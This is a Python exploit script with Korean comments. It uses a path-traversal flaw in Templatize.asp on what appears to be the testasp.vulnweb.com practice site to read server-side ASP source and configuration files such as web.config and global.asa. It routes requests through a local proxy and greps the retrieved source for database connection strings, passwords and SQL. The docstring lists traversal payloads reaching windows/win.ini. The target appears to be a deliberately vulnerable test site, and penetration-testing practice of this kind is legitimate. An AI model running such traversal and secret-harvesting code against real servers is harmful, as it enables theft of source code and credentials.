#!/usr/bin/env python3
"""Round 5 — traversal 로 ASP 소스/설정 파일 읽기 (Templatize.asp 경유).

Round 4 에서 확인한 경로 해석 규칙: item 은 **응용 루트 기준 상대경로**로 풀린다.
  - item=html/about.html        (정상: html 하위 조각)
  - item=html/../web.config     (루트의 web.config → 성공)
  - item=../web.config          (부모 디렉토리 → 파일 없음 → 500)
  - item=../../../../../../../../windows/win.ini (충분히 올라가면 성공)
따라서 루트에 있는 .asp 파일은 item=<파일명> 으로 **소스가 그대로** 읽힐 수 있다(서버가
실행하지 않고 include 하므로).
"""
import subprocess, urllib.parse, os, re, hashlib

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
OUT = "/tmp/exploit/src"
os.makedirs(OUT, exist_ok=True)


def fetch(item):
    url = f"{BASE}/Templatize.asp?item=" + urllib.parse.quote(item, safe="/.")
    hp, bp = "/tmp/exploit/src/.h", "/tmp/exploit/src/.b"
    subprocess.run(["curl", "-s", "-D", hp, "-o", bp, "-m", "30"] + PROXY + [url],
                   capture_output=True, text=True)
    status = open(hp, encoding="latin-1").read().split("\n")[0].strip()
    body = open(bp, encoding="latin-1").read()
    return status, body


def extract_inner(body):
    m = re.search(r"InstanceBeginEditable name=\"MainContentLeft\" -->(.*?)<!-- InstanceEndEditable",
                  body, re.S)
    return m.group(1).strip() if m else None


candidates = [
    "Default.asp", "showforum.asp", "showthread.asp", "Search.asp", "Login.asp",
    "Register.asp", "Logout.asp", "Templatize.asp",
    "web.config", "styles.css",
    "Templates/MainTemplate.dwt.asp",
    "conn.asp", "db.asp", "dbconnect.asp", "connection.asp", "common.asp", "includes.asp",
    "global.asa", "config.asp", "settings.asp", "ado.asp",
]

print("=" * 92)
print("### 소스/설정 파일 읽기 시도 (item = 응용 루트 기준 상대경로)")
found = {}
for c in candidates:
    st, body = fetch(c)
    inner = extract_inner(body)
    ok = bool(inner) and "Internal Server Error" not in st
    print(f"  {c:32s} -> {st[:30]:30s} len={len(body):6d}  inner={'yes' if inner else 'no'}"
          + ("  🎯 SOURCE" if ok else ""))
    if ok:
        found[c] = inner
        open(f"{OUT}/{c.replace('/', '_')}", "w", encoding="latin-1").write(inner)
        print(f"      첫 200자: {inner[:200]!r}")

print()
print("=" * 92)
print("### 읽힌 소스에서 민감 패턴 grep")
pats = {
    "SQL 쿼리": r"(?i)(select|insert|update|delete)\s+[^\r\n]{0,160}",
    "DB 연결 문자열": r"(?i)(Provider=|Data Source=|User ID=|Password=|Initial Catalog=)[^\r\n\"']{0,120}",
    "Server.MapPath": r"(?i)Server\.MapPath\([^)]{0,120}\)",
    "include": r"(?i)<!--\s*#include[^>]{0,120}-->",
    "Session": r"(?i)Session\(\"[^\"]+\"\)",
    "파일 시스템": r"(?i)(FileSystemObject|CreateObject\([^)]{0,60}\))",
    "comment": r"(?i)(TODO|FIXME|password|passwd|pwd)\S{0,40}",
}
for name, inner in found.items():
    print(f"\n--- {name} ---")
    for label, pat in pats.items():
        hits = re.findall(pat, inner)
        uniq = []
        for h in hits:
            h1 = (h if isinstance(h, str) else " ".join(h)).strip()
            if h1 and h1 not in uniq:
                uniq.append(h1)
        if uniq:
            print(f"  [{label}] {len(uniq)}건")
            for h in uniq[:8]:
                print(f"      {h[:150]}")
